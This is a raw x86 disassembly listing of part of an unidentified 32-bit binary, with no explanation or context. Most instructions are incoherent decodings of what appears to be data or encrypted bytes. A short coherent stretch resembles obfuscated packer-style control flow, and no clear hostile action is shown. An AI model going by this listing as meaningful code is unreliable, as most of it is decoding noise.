  40bd2d:	push   0x4
  40bd2f:	push   cs
  40bd30:	nop
  40bd31:	or     eax,edi
  40bd33:	xchg   ebp,eax
  40bd34:	aas    
  40bd35:	imul   eax,DWORD PTR [edi],0x2f1a6d6
  40bd3b:	fucomi st,st(1)
  40bd3d:	xchg   ebx,eax
  40bd3e:	push   eax
  40bd3f:	jbe    0x40bceb
  40bd41:	out    0xb9,al
  40bd43:	inc    edi
  40bd44:	fstp   TBYTE PTR [esi+0x442e9b95]
  40bd4a:	or     cl,BYTE PTR [ecx+edi*8+0x5a]
  40bd4e:	ja     0x40bcea
  40bd50:	fidivr DWORD PTR [edx-0x14f9dad4]
  40bd56:	out    dx,al
  40bd57:	mov    ebp,0xd038867c
  40bd5c:	rcr    ebp,cl
  40bd5e:	iret   
  40bd5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd60:	sbb    DWORD PTR [ecx],esp
  40bd62:	xchg   esp,eax
  40bd63:	fimul  DWORD PTR [ebp-0x5c]
  40bd66:	jne    0x40bd1d
  40bd68:	cmp    al,0xb7
  40bd6a:	jge    0x40bd6c
  40bd6c:	pop    ebp
  40bd6d:	test   al,0x3f
  40bd6f:	call   0x6a16:0xf7a102c
  40bd76:	xchg   BYTE PTR [ebx+0x46],ah
  40bd79:	mov    al,ds:0xc63c4fe8
  40bd7e:	jae    0x40bd83
  40bd80:	std    
  40bd81:	rep stos BYTE PTR es:[edi],al
  40bd83:	xor    ecx,esi
  40bd85:	add    BYTE PTR [edi+0x47],dl
  40bd88:	stos   BYTE PTR es:[edi],al
  40bd89:	fidivr DWORD PTR [ebx]
  40bd8b:	or     esp,DWORD PTR [ebp+ebx*1-0x53]
  40bd8f:	shl    DWORD PTR [edi],0x68
  40bd92:	inc    esi
  40bd93:	(bad)  
  40bd94:	cmc    
  40bd95:	sub    ch,0x72
  40bd98:	sub    DWORD PTR [eax],esp
  40bd9a:	push   eax
  40bd9b:	xchg   BYTE PTR [ecx-0xce3815c],ah
  40bda1:	sub    dl,ah
  40bda3:	sahf   
  40bda4:	stc    
  40bda5:	iret   
  40bda6:	je     0x40bd3c
  40bda8:	add    eax,0x88e9c46f
  40bdad:	pop    ds
  40bdae:	popf   
  40bdaf:	adc    eax,0x87d8ec90
  40bdb4:	clc    
  40bdb5:	or     al,cl
  40bdb7:	xchg   ecx,eax
  40bdb8:	xor    ah,BYTE PTR [edx+ebp*1]
  40bdbb:	repz cmp ah,BYTE PTR [ecx-0x758af953]
  40bdc2:	pop    esp
  40bdc3:	adc    eax,DWORD PTR [esi]
  40bdc5:	aad    0xb8
  40bdc7:	and    edi,edi
  40bdc9:	fld    TBYTE PTR ds:0x68f5f261
  40bdcf:	out    0x5b,eax
  40bdd1:	not    edi
  40bdd3:	adc    bh,BYTE PTR [ecx+esi*2]
  40bdd6:	and    BYTE PTR [eax],ch
  40bdd8:	xchg   DWORD PTR [ebx+0x6a5783b1],ecx
  40bdde:	push   ecx
  40bddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bde0:	push   ds
  40bde1:	sub    dl,bh
  40bde3:	push   edi
  40bde4:	sub    eax,ebx
  40bde6:	jl     0x40bdb7
  40bde8:	cmp    BYTE PTR cs:[edx],bl
  40bdeb:	sub    BYTE PTR [ecx+0x2d],al
  40bdee:	and    DWORD PTR [ebx+0x32],esp
  40bdf1:	(bad)  
  40bdf2:	mov    esp,0x38c973d7
  40bdf7:	fcomip st,st(3)
  40bdf9:	icebp  
  40bdfa:	sbb    cl,ch
  40bdfc:	xor    al,0xc6
  40bdfe:	dec    ecx
  40bdff:	xor    al,BYTE PTR fs:[esi-0x54699d10]
  40be06:	cmp    BYTE PTR [edx+0x7],0x75
  40be0a:	push   edi
  40be0b:	out    0x98,al
  40be0d:	or     DWORD PTR [ebx],esp
  40be0f:	in     eax,dx
  40be10:	mov    dl,0xf9
  40be12:	mov    ah,0xbb
  40be14:	cs ja  0x40be5b
  40be17:	sub    DWORD PTR [edx-0x45],ebx
  40be1a:	(bad)  
  40be1b:	out    dx,al
  40be1c:	adc    esi,DWORD PTR [ebx-0x1f]
  40be1f:	dec    ebp
  40be20:	mov    esi,0xc722878e
  40be25:	add    ebx,edi
  40be27:	loop   0x40be7c
  40be29:	test   DWORD PTR [esi],esp
  40be2b:	cmp    DWORD PTR [edx-0x2],ecx
  40be2e:	push   es
  40be2f:	mov    ds,WORD PTR [edi]
  40be31:	(bad)  
  40be32:	(bad)  
  40be33:	ror    BYTE PTR ds:0x6f700375,1
  40be39:	and    dl,al
  40be3b:	xor    bh,BYTE PTR [ebp+0x2e140549]
  40be41:	xchg   ebp,eax
  40be42:	repnz ss push edx
  40be45:	mov    esp,0x4ba87dd4
  40be4a:	fild   WORD PTR [eax+0x169fc28a]
  40be50:	dec    ebx
  40be51:	dec    ebx
  40be52:	xor    al,0xe5
  40be54:	mov    ah,0xf9
  40be56:	add    DWORD PTR [ebp+0x73],ecx
  40be59:	xor    al,bh
  40be5b:	dec    ebx
  40be5c:	outs   dx,DWORD PTR ds:[esi]
  40be5d:	jecxz  0x40bed6
  40be5f:	dec    esi
  40be60:	push   ebx
  40be61:	push   ss
  40be62:	add    ebx,DWORD PTR [ecx-0x2cdb9bea]
  40be68:	imul   esi,DWORD PTR [edx+0x665b8fe0],0xffffffed
  40be6f:	int3   
  40be70:	push   0x18
  40be72:	gs pushf 
  40be74:	mov    dh,0x7c
  40be76:	xchg   ebp,eax
  40be77:	pop    es
  40be78:	mov    esi,0xc4a427c8
  40be7d:	leave  
  40be7e:	jbe    0x40be9c
  40be80:	pop    es
  40be81:	pop    edx
  40be82:	mov    BYTE PTR [edi+0x5c],bh
  40be85:	inc    esi
  40be86:	call   0x6f6735d7
  40be8b:	dec    ecx
  40be8c:	gs inc ebx
  40be8e:	arpl   bp,di
  40be90:	pop    ebx
  40be91:	xor    DWORD PTR [ebx+0x74],esp
  40be94:	xchg   ebx,eax
  40be95:	add    al,0x24
  40be97:	xor    al,0x0
  40be99:	call   0x9ed5b7d4
  40be9e:	not    DWORD PTR [edx-0x261a2fd7]
  40bea4:	inc    esp
  40bea5:	ret    
  40bea6:	jmp    0x40be55
  40bea8:	aam    0x2a
  40beaa:	fcom   st(7)
  40beac:	js     0x40bf01
  40beae:	sbb    DWORD PTR [edi-0x75],edx
  40beb1:	jge    0x40bebb
  40beb3:	mov    eax,ds:0x424435
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	aas    
  40c013:	cwde   
  40c014:	cmp    BYTE PTR [edi-0x2c],al
  40c017:	jmp    0x5f5a3a96
  40c01c:	jp     0x40c098
  40c01e:	sub    DWORD PTR [ecx],ebx
  40c020:	or     ch,BYTE PTR [ebx]
  40c022:	inc    ecx
  40c023:	add    dl,BYTE PTR [esi+0x2]
  40c026:	mov    esp,0x666a58de
  40c02b:	pop    ds
  40c02c:	add    dl,ah
  40c02e:	lock lods eax,DWORD PTR ds:[esi]
  40c030:	loop   0x40bff5
  40c032:	cmp    BYTE PTR [eax+0x4e3335e1],bh
  40c038:	fld    QWORD PTR ds:0x221977f8
  40c03e:	jecxz  0x40c08e
  40c040:	jns    0x40bffc
  40c042:	or     al,0x14
  40c044:	aam    0xf9
  40c046:	push   ss
  40c047:	dec    DWORD PTR [edi+edx*4+0x51b91098]
  40c04e:	fwait
  40c04f:	imul   esi,DWORD PTR [ebx+0x4f],0xcac5618
  40c056:	in     al,0x68
  40c058:	push   cs
  40c059:	xchg   edx,eax
  40c05a:	push   eax
  40c05b:	cmc    
  40c05c:	arpl   WORD PTR [eax-0x54c0da11],cx
  40c062:	ret    
  40c063:	push   es
  40c064:	rcl    BYTE PTR [edi-0x63],cl
  40c067:	pop    ebx
  40c068:	adc    DWORD PTR [eax+0x3825b741],eax
  40c06e:	jle    0x40c021
  40c070:	lds    ebp,FWORD PTR [esi+edi*8+0x65]
  40c074:	xor    al,0xc3
  40c076:	sbb    ecx,DWORD PTR [ebx]
  40c078:	jmp    0x40c01a
  40c07a:	in     al,dx
  40c07b:	add    DWORD PTR [ebx],ebp
  40c07d:	add    al,0x20
  40c07f:	push   esi
  40c080:	sbb    ecx,DWORD PTR [ecx]
  40c082:	int    0x3a
  40c084:	jecxz  0x40c059
  40c086:	(bad)  
  40c087:	in     al,0x67
  40c089:	jo     0x40c080
  40c08b:	neg    DWORD PTR [edi-0x24647ccc]
  40c091:	mov    ebx,0xf5b0cba0
  40c096:	stos   BYTE PTR es:[edi],al
  40c097:	mov    eax,ds:0xf0895ed0
  40c09c:	mov    edx,0x76b8dcf4
  40c0a1:	ret    0x1382
  40c0a4:	pop    edx
  40c0a5:	mov    cl,0xe6
  40c0a7:	pop    ss
  40c0a8:	dec    edx
  40c0a9:	sbb    edx,esp
  40c0ab:	fisubr DWORD PTR [ebp+0x5e]
  40c0ae:	(bad)  
  40c0af:	int3   
  40c0b0:	in     eax,0xc2
  40c0b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0b3:	lahf   
  40c0b4:	push   ebp
  40c0b5:	loope  0x40c093
  40c0b7:	adc    BYTE PTR [edi-0x4302f28c],cl
  40c0bd:	nop
  40c0be:	test   DWORD PTR [ebp-0x55a6b76e],esp
  40c0c4:	mov    al,0x71
  40c0c6:	jno    0x40c0d2
  40c0c8:	jb     0x40c0b5
  40c0ca:	sar    BYTE PTR [esi+edx*8],0x5e
  40c0ce:	mov    al,ds:0x9a614ed4
  40c0d3:	cmp    BYTE PTR [edx],ch
  40c0d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0d6:	mov    esi,0x6b30ad87
  40c0db:	cmp    al,0x99
  40c0dd:	xchg   ebx,eax
  40c0de:	sti    
  40c0df:	idiv   DWORD PTR [eax+0x7ec22537]
  40c0e5:	jno    0x40c06e
  40c0e7:	pop    esi
  40c0e8:	jp     0x40c145
  40c0ea:	int    0xd0
  40c0ec:	jae    0x40c0f5
  40c0ee:	out    0xf3,al
  40c0f0:	mov    ch,0xa6
  40c0f2:	clc    
  40c0f3:	inc    edi
  40c0f4:	mov    DWORD PTR [ebx-0x71478515],esi
  40c0fa:	cmp    eax,DWORD PTR [edx]
  40c0fc:	sahf   
  40c0fd:	mov    bh,0x2e
  40c0ff:	and    bl,al
  40c101:	mov    BYTE PTR [edx-0x5],dh
  40c104:	stc    
  40c105:	shl    BYTE PTR [ebp+0x795b43d8],cl
  40c10b:	ror    DWORD PTR [eax],cl
  40c10d:	pop    es
  40c10e:	lods   al,BYTE PTR ds:[esi]
  40c10f:	and    DWORD PTR [ebx+0x36],ebx
  40c112:	rcl    BYTE PTR [edi],0x94
  40c115:	mul    DWORD PTR [edi]
  40c117:	sbb    cl,al
  40c119:	and    BYTE PTR [edx-0x22f1780b],bh
  40c11f:	repnz ss dec eax
  40c122:	xchg   edi,eax
  40c123:	nop
  40c124:	mov    ebx,0xdfc2b000
  40c129:	or     al,0x54
  40c12b:	loopne 0x40c1a1
  40c12d:	cmc    
  40c12e:	addr16 sti 
  40c130:	or     eax,0x91895f7a
  40c135:	ja     0x40c11a
  40c137:	cdq    
  40c138:	out    dx,eax
  40c139:	mov    eax,ebx
  40c13b:	pop    es
  40c13c:	push   ebx
  40c13d:	jo     0x40c0ed
  40c13f:	lea    ebp,[esi]
  40c141:	cld    
  40c142:	loopne 0x40c149
  40c144:	arpl   WORD PTR [eax],di
  40c146:	sbb    eax,0x239bea36
  40c14b:	xor    BYTE PTR ds:0x19b36312,al
  40c151:	(bad)  
  40c153:	jmp    0xa4d26b07
  40c158:	lods   eax,DWORD PTR ds:[si]
  40c15a:	jl     0x40c111
  40c15c:	jb     0x40c196
  40c15e:	sar    BYTE PTR [ebx],cl
  40c160:	jmp    0xfb2e:0x32d77078
  40c167:	and    ecx,DWORD PTR [edi+0x2d]
  40c16a:	sub    DWORD PTR [edi],ebp
  40c16c:	in     al,0xc0
  40c16e:	push   edi
  40c16f:	out    0x6d,al
  40c171:	pop    ebx
  40c172:	gs push edx
  40c174:	mov    edi,edi
  40c176:	and    BYTE PTR [ebx+esi*2-0x65],bh
  40c17a:	test   DWORD PTR [esi],eax
  40c17c:	aad    0xda
  40c17e:	cmp    DWORD PTR [ecx-0x62],eax
  40c181:	inc    eax
  40c182:	aas    
  40c183:	fwait
  40c184:	call   0xc94e:0x74bd31ee
  40c18b:	sub    al,0x40
  40c18d:	mov    esi,0x65646926
  40c192:	mov    al,ds:0x31bb4e51
  40c197:	cs push 0xa5f3b743
  40c19d:	out    0x65,eax
  40c19f:	push   esi
  40c1a0:	dec    edx
  40c1a1:	call   0x2f5f:0x14bcc80c
  40c1a8:	cmp    eax,0x250b59ab
  40c1ad:	inc    ecx
  40c1ae:	mov    dl,0xc1
  40c1b0:	fimul  DWORD PTR [esi+0x25]
  40c1b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1b4:	in     eax,dx
  40c1b5:	sbb    ch,BYTE PTR [ebx-0x4f]
  40c1b8:	pusha  
  40c1b9:	jbe    0x40c1ee
  40c1bb:	push   ebx
  40c1bc:	int    0xd
  40c1be:	xchg   edx,eax
  40c1bf:	push   0xce8575f1
  40c1c4:	adc    BYTE PTR [ecx],bl
  40c1c6:	push   ebx
  40c1c7:	bound  ebp,QWORD PTR [edx+0x1aa8c87e]
  40c1cd:	aad    0x34
  40c1cf:	jo     0x40c1e3
  40c1d1:	ins    BYTE PTR es:[edi],dx
  40c1d2:	sbb    BYTE PTR [ecx+ebx*8+0x4e],bh
  40c1d6:	mov    al,0x96
  40c1d8:	cmc    
  40c1d9:	mov    ecx,0x4b8bd131
  40c1de:	add    al,0xa5
  40c1e0:	outs   dx,BYTE PTR ds:[esi]
  40c1e1:	jb     0x40c1e8
  40c1e3:	cmc    
  40c1e4:	mov    esi,0x7b791c6
  40c1e9:	ret    0xda49
  40c1ec:	scas   al,BYTE PTR es:[edi]
  40c1ed:	push   ecx
  40c1ee:	lds    esi,FWORD PTR [eax]
  40c1f0:	je     0x40c1cf
  40c1f2:	sub    dl,BYTE PTR [esi+0x2b]
  40c1f5:	mov    WORD PTR [eax+0x7],es
  40c1f8:	dec    edx
  40c1f9:	daa    
  40c1fa:	jae    0x40c1ee
  40c1fc:	push   cs
  40c1fd:	pop    ss
  40c1fe:	mov    esi,0x80c1a50d
  40c203:	mov    bh,0xb2
  40c205:	in     eax,0x7c
  40c207:	mov    ecx,DWORD PTR [edx-0x77]
  40c20a:	xchg   DWORD PTR [edx-0x7f],esp
  40c20d:	jmp    0xa8cfc9a8
  40c212:	jno    0x40c1f7
  40c214:	mov    ds:0xfee4877a,eax
  40c219:	adc    bh,dh
  40c21b:	jg     0x40c1e8
  40c21d:	stc    
  40c21e:	adc    eax,0xecccd698
  40c223:	fisubr DWORD PTR [ebx-0x7584a00d]
  40c229:	jl     0x40c246
  40c22b:	xchg   BYTE PTR [edi],bh
  40c22d:	adc    al,0x7b
  40c22f:	fwait
  40c230:	inc    esi
  40c231:	addr16 dec edi
  40c233:	int3   
  40c234:	or     al,0xb6
  40c236:	sub    dl,BYTE PTR [ebx+0x44]
  40c239:	jae    0x40c287
  40c23b:	gs adc al,ch
  40c23e:	xor    al,0x32
  40c240:	add    DWORD PTR [esi-0xa],0x27
  40c244:	jg     0x40c21f
  40c246:	call   0x6cff7bfa
  40c24b:	dec    edx
  40c24c:	inc    esp
  40c24d:	mov    ah,0x25
  40c24f:	xor    BYTE PTR [esi+ebp*1+0x2c],dh
  40c253:	push   ecx
  40c254:	pop    esp
  40c255:	mov    WORD PTR [ecx],gs
  40c257:	jecxz  0x40c2c2
  40c259:	cdq    
  40c25a:	clc    
  40c25b:	xlat   BYTE PTR ds:[ebx]
  40c25c:	jb     0x40c251
  40c25e:	mov    dl,0xe3
  40c260:	cmp    al,0x48
  40c262:	aad    0xd0
  40c264:	inc    edi
  40c265:	shl    BYTE PTR [eax-0x67fca32d],cl
  40c26b:	cld    
  40c26c:	or     al,cl
  40c26e:	icebp  
  40c26f:	mov    bh,0x7
  40c271:	std    
  40c272:	popf   
  40c273:	jmp    0xd224:0x2add96c6
  40c27a:	jne    0x40c207
  40c27c:	cmc    
  40c27d:	adc    DWORD PTR [edi],ebp
  40c27f:	xchg   BYTE PTR [ebx-0x4],ah
  40c282:	lods   al,BYTE PTR ds:[esi]
  40c283:	sub    eax,DWORD PTR [edi-0x33c04eb5]
  40c289:	xchg   ebx,eax
  40c28a:	popf   
  40c28b:	(bad)  
  40c28c:	sub    eax,DWORD PTR [eax]
  40c28e:	js     0x40c2bc
  40c290:	pushf  
  40c291:	mov    ch,0xc
  40c293:	adc    al,0xc
  40c295:	push   edi
  40c296:	retf   
  40c297:	outs   dx,BYTE PTR ds:[esi]
  40c298:	rcl    ebx,1
  40c29a:	inc    ecx
  40c29b:	shl    DWORD PTR [esi-0x69],cl
  40c29e:	fnstenv [ebp+0x576b48b9]
  40c2a4:	dec    esi
  40c2a5:	add    dh,BYTE PTR [ecx]
  40c2a7:	cs pushf 
  40c2a9:	and    BYTE PTR [eax+0x17],dh
  40c2ac:	and    ebp,esi
  40c2ae:	icebp  
  40c2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2b0:	adc    BYTE PTR [edi],dl
  40c2b2:	xchg   ecx,ebp
  40c2b4:	inc    ecx
  40c2b5:	imul   ebx,eax,0x19
  40c2b8:	inc    edx
  40c2b9:	mul    BYTE PTR [ebx]
  40c2bb:	pushf  
  40c2bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2bd:	push   esi
  40c2be:	es fld DWORD PTR es:[ebx+0x5c]
  40c2c3:	ror    DWORD PTR [eax],0xff
  40c2c6:	imul   ebx,DWORD PTR [edi+0x1e],0x83824cce
  40c2cd:	aas    
  40c2ce:	mov    ch,0x10
  40c2d0:	mov    al,0xef
  40c2d2:	mov    BYTE PTR [esp+esi*2+0xf827303],ah
  40c2d9:	fcmovb st,st(3)
  40c2db:	pop    ds
  40c2dc:	xchg   esp,eax
  40c2dd:	adc    esi,DWORD PTR [ebx-0x3a]
  40c2e0:	ins    DWORD PTR es:[edi],dx
  40c2e1:	or     BYTE PTR [ecx+0x58],0x7
  40c2e5:	int3   
  40c2e6:	mov    esp,DWORD PTR [ebp+edx*1-0x6e6ef363]
  40c2ed:	scas   eax,DWORD PTR es:[edi]
  40c2ee:	sub    eax,0x7b6bcfe0
  40c2f3:	jmp    0x1714:0x24dca0a3
  40c2fa:	lahf   
  40c2fb:	fistp  WORD PTR [ebx+0x11]
  40c2fe:	int3   
  40c2ff:	adc    BYTE PTR [edi-0x1d],0xa7
  40c303:	test   al,0xcc
  40c305:	jne    0x40c385
  40c307:	push   ss
  40c308:	inc    ecx
  40c309:	shl    DWORD PTR [ebx+0x58],1
  40c30c:	push   edi
  40c30d:	jbe    0x40c312
  40c30f:	xchg   esi,eax
  40c310:	and    ebx,ebx
  40c312:	(bad)  
  40c314:	sahf   
  40c315:	in     al,dx
  40c316:	xor    al,BYTE PTR [edx]
  40c318:	nop
  40c319:	pushf  
  40c31a:	mov    ecx,0x4a958a75
  40c31f:	inc    eax
  40c320:	cmp    al,0xe
  40c322:	aaa    
  40c323:	ret    
  40c324:	test   DWORD PTR [ecx],0x4a9d9aeb
  40c32a:	xchg   ebp,eax
  40c32b:	pop    eax
  40c32c:	mov    BYTE PTR [edi-0x47],al
  40c32f:	and    eax,0xa6d44be6
  40c334:	ins    DWORD PTR es:[edi],dx
  40c335:	push   edi
  40c336:	out    dx,eax
  40c337:	retf   0x7cc6
  40c33a:	(bad)  
  40c33b:	adc    ebx,eax
  40c33d:	push   ebx
  40c33e:	pop    ebp
  40c33f:	mov    ds:0xf49771e6,eax
  40c344:	and    BYTE PTR [ebp-0x6f],bh
  40c347:	xchg   edi,eax
  40c348:	mov    ebp,0xc75c5068
  40c34d:	inc    esi
  40c34e:	and    BYTE PTR [esp+esi*8],cl
  40c351:	xlat   BYTE PTR ds:[ebx]
  40c352:	ficom  DWORD PTR [ebx+edx*2]
  40c355:	jp     0x40c31d
  40c357:	and    edx,DWORD PTR [ebx+0x7d]
  40c35a:	aad    0x1b
  40c35c:	out    dx,eax
  40c35d:	dec    eax
  40c35e:	mov    BYTE PTR ds:0xc9d11d39,bh
  40c364:	fdiv   DWORD PTR [ecx]
  40c366:	loop   0x40c3e1
  40c368:	outs   dx,DWORD PTR ds:[esi]
  40c369:	in     al,dx
  40c36a:	sbb    eax,0xa7a78d3e
  40c36f:	ficom  DWORD PTR [edi]
  40c371:	sub    ebx,DWORD PTR [edi]
  40c373:	and    esp,esi
  40c375:	lods   al,BYTE PTR ds:[esi]
  40c376:	addr16 pop es
  40c378:	scas   al,BYTE PTR es:[edi]
  40c379:	loopne 0x40c36c
  40c37b:	das    
  40c37c:	cs out dx,al
  40c37e:	ins    BYTE PTR es:[edi],dx
  40c37f:	outs   dx,BYTE PTR ds:[esi]
  40c380:	xor    edi,DWORD PTR [ecx+0x6e]
  40c383:	ja     0x40c37e
  40c385:	pop    ss
  40c386:	outs   dx,DWORD PTR ds:[esi]
  40c387:	in     al,0xfc
  40c389:	retf   
  40c38a:	sub    DWORD PTR [eax+0x4a0987c],esi
  40c390:	push   0xffffffee
  40c392:	pop    esi
  40c393:	imul   al
  40c395:	mov    ss,WORD PTR [eax-0x45]
  40c398:	dec    eax
  40c399:	call   0xeb38:0x9736b216
  40c3a0:	stc    
  40c3a1:	call   0x103bef2c
  40c3a6:	mov    cl,0x69
  40c3a8:	jb     0x40c348
  40c3aa:	imul   ecx,DWORD PTR [ecx],0xffffff99
  40c3ad:	mov    dl,0x30
  40c3af:	out    dx,al
  40c3b0:	cmp    eax,0x1caa3e3d
  40c3b5:	sub    DWORD PTR [eax+edx*4-0x4af24dc6],edx
  40c3bc:	fiadd  DWORD PTR [ebx-0x58ae0229]
  40c3c2:	mov    bh,BYTE PTR [edi+0x56]
  40c3c5:	ins    DWORD PTR es:[edi],dx
  40c3c6:	adc    DWORD PTR [edx-0x53],ebp
  40c3c9:	icebp  
  40c3ca:	or     eax,0x1a3ce4f3
  40c3cf:	bound  edi,QWORD PTR [esi]
  40c3d1:	iret   
  40c3d2:	mov    ebx,0x94738e90
  40c3d7:	jb     0x40c3db
  40c3d9:	mov    WORD PTR [edx-0x4c751f6e],es
  40c3df:	xor    dh,BYTE PTR [edx+0x5a]
  40c3e2:	jne    0x40c37a
  40c3e4:	neg    dl
  40c3e6:	xchg   esp,eax
  40c3e7:	adc    bl,bl
  40c3e9:	sub    edx,DWORD PTR [eax+0x19d2e3bc]
  40c3ef:	enter  0xee28,0x4
  40c3f3:	fsub   DWORD PTR [ecx+0x1be3cfa9]
  40c3f9:	push   ss
  40c3fa:	lds    esp,FWORD PTR [eax+eax*2+0x2d]
  40c3fe:	dec    edx
  40c3ff:	pop    edx
  40c400:	and    eax,0x139844bd
  40c405:	pop    es
  40c406:	push   eax
  40c407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c408:	xchg   ecx,eax
  40c409:	pop    ebx
  40c40a:	ret    0x7d5
  40c40d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c40e:	jmp    0xc8b4:0x18ec5ad7
  40c415:	xchg   edx,eax
  40c416:	inc    edx
  40c417:	psraw  mm1,QWORD PTR [ebx-0x6955d255]
  40c41e:	pop    ds
  40c41f:	sbb    DWORD PTR [edx],esp
  40c421:	leave  
  40c422:	popa   
  40c423:	clc    
  40c424:	pop    edi
  40c425:	sbb    DWORD PTR [ecx],eax
  40c427:	std    
  40c428:	xor    DWORD PTR [ebp+0x207691bf],edi
  40c42e:	xchg   ebp,eax
  40c42f:	cmp    eax,0x516e98d2
  40c434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c435:	inc    BYTE PTR [edx]
  40c437:	dec    eax
  40c438:	mov    al,ds:0xcab24a02
  40c43d:	add    eax,ecx
  40c43f:	arpl   WORD PTR [edx+0x7d33cbac],di
  40c445:	mov    eax,ds:0x542e0194
  40c44a:	and    DWORD PTR [ebx+0x333210ce],edx
  40c450:	mov    bl,0x4f
  40c452:	loopne 0x40c3fd
  40c454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c455:	xchg   esp,eax
  40c456:	xchg   DWORD PTR [eax+0x52],edi
  40c459:	out    0xa5,al
  40c45b:	lock mov cl,0x59
  40c45e:	sub    al,0x2a
  40c460:	dec    edi
  40c461:	rol    BYTE PTR [edx+0x7a2f27b1],0x46
  40c468:	iret   
  40c469:	imul   esp,DWORD PTR [edi-0x425216ca],0x661cbf19
  40c473:	fisttp WORD PTR [edx-0x1d8a9533]
  40c479:	rcr    DWORD PTR [edx],0xb8
  40c47c:	inc    edi
  40c47d:	das    
  40c47e:	and    al,0x97
  40c480:	(bad)  [esi+ecx*8]
  40c483:	(bad)  
  40c484:	mov    ds:0x5fcc526d,al
  40c489:	scas   al,BYTE PTR es:[edi]
  40c48a:	mov    al,0x62
  40c48c:	push   eax
  40c48d:	push   ax
  40c48f:	sbb    ah,dh
  40c491:	xchg   esi,eax
  40c492:	push   ss
  40c493:	cli    
  40c494:	jle    0x40c434
  40c496:	shl    DWORD PTR [edx-0x656ec3dd],0x9
  40c49d:	sub    BYTE PTR [bx+si-0x24e9],0x79
  40c4a3:	dec    eax
  40c4a4:	and    DWORD PTR [ebp-0x9],eax
  40c4a7:	std    
  40c4a8:	sahf   
  40c4a9:	pop    ebx
  40c4aa:	aas    
  40c4ab:	out    0x85,eax
  40c4ad:	pop    ebp
  40c4ae:	cmp    BYTE PTR [edx-0x356ca7e0],0xd5
  40c4b5:	jo     0x40c4d2
  40c4b7:	imul   esp,DWORD PTR [ebx+0x45],0x1f
  40c4bb:	js     0x40c47b
  40c4bd:	outs   dx,DWORD PTR ds:[esi]
  40c4be:	jae    0x40c469
  40c4c0:	mov    ds:0x67e9a5f7,al
  40c4c5:	popa   
  40c4c6:	xchg   esp,eax
  40c4c7:	(bad)  
  40c4c8:	mov    cl,BYTE PTR [esi+edi*8]
  40c4cb:	(bad)  
  40c4cc:	int    0xd
  40c4ce:	out    0x10,al
  40c4d0:	int3   
  40c4d1:	cmp    dl,bl
  40c4d3:	and    BYTE PTR [ecx-0x5d792073],cl
  40c4d9:	add    DWORD PTR [edi+0x21b1f61c],esp
  40c4df:	and    al,0xba
  40c4e1:	xchg   esi,eax
  40c4e2:	nop
  40c4e3:	sti    
  40c4e4:	push   0x44
  40c4e6:	aas    
  40c4e7:	or     al,0x5b
  40c4e9:	xor    eax,0xf1012379
